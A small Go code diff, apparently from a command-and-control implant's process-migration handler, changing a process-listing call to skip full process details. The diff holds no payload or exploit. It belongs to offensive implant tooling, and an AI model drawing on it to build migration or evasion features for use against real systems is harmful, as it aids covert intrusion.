@@ -477,8 +477,8 @@ func migrateHandler(data []byte, resp RPCResponse) {
 			migrateResp.Success = false
 			migrateResp.Response = &commonpb.Response{}
 		} else {
-			// Search for the PID
-			processes, err := ps.Processes()
+			// Search for the PID, do not need all info about the process
+			processes, err := ps.Processes(false)
 			if err != nil {
 				// {{if .Config.Debug}}
 				log.Printf("failed to list procs %v", err)
